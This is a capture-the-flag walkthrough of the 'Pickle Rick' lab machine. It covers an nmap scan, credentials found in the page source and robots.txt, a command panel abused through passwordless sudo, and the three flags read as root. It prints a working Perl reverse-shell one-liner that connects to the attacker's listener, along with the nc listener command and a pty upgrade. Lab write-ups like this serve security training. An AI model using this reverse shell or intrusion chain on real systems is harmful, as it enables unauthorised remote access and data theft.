# PICKLE RICK

## IP = `10.10.228.71`

Firstly I run nmap:
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -A -T4 10.10.160.5   

Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bf:0b:f0:00:29:36:63:63:dd:4d:4c:13:39:89:a0:a1 (RSA)
|   256 54:6e:e9:4f:24:da:9c:ff:7c:a4:a1:6c:91:cc:d1:8b (ECDSA)
|_  256 00:92:31:83:2f:51:67:99:42:49:56:83:f7:68:77:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   304.15 ms 10.2.0.1
2   ... 3
4   352.47 ms 10.10.160.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.57 seconds
```

On port 80 there is a website and without any buttons so I check webpage source and at the bottom see:
```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Also in source, I noticed a folder /assets with many files inside:
```
Index of /assets
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	bootstrap.min.css	2019-02-10 16:37 	119K	 
[ ]	bootstrap.min.js	2019-02-10 16:37 	37K	 
[IMG]	fail.gif	2019-02-10 16:37 	49K	 
[ ]	jquery.min.js	2019-02-10 16:37 	85K	 
[IMG]	picklerick.gif	2019-02-10 16:37 	222K	 
[IMG]	portal.jpg	2019-02-10 16:37 	50K	 
[IMG]	rickandmorty.jpeg	2019-02-10 16:37 	488K	 
Apache/2.4.18 (Ubuntu) Server at 10.10.228.71 Port 80
```
I checked if any of these .jpg files have a .php alternative and bingo, there is `/portal.php` with login / password field to type in.

Another basic thing worth doing is to always check /robots.txt
Apparently, I find there a long word which looks like a password:
`Wubbalubbadubdub`

I type two of these in `/portal.php` and aget access to a panel, with some options and window to type. 
My first guess it to try `ls` and among one of results there is `Sup3rS3cretPickl3Ingred.txt`
so I go to `http://10.10.228.71/Sup3rS3cretPickl3Ingred.txt` and get a first ingredient.

I also noticed that some of commands are blocked and also it is impossible to access sections while clicking on buttons on the right. After some time of clicking, I tried to search `*txt` files using `grep` but nothing worked. I thought about typing `grep -R ""` which turned out to ba good move as website crashed and I got all paths and it's source visible.

There is a list of blocked commands in source, but I checked if our user has sudo by `sudo -l`:
```
Matching Defaults entries for www-data on ip-10-10-228-71.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-228-71.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
and seems like we can execute commands with sudo rights.

One interesting thing is that we cannot go to another directory or view other files. So I tried to view all files on a server and it worked out with `sudo ls ../../../*`

In order to browse machine in easier way, I typed:
```
perl -e 'use Socket;$i="10.2.46.111";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

and ran `sudo nc -lvnp 4444` in the same time to get shell. 
Of course right after I typed `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get interactive shell


So now once again `sudo ls ../../../*` to get list of all files. After some searching, I find a second flag in /home/rick/second inngredient with

`sudo cat /home/rick/"second ingredients"`

and third flag in /root:

`sudo cat /root/3rd.txt`

Finished.
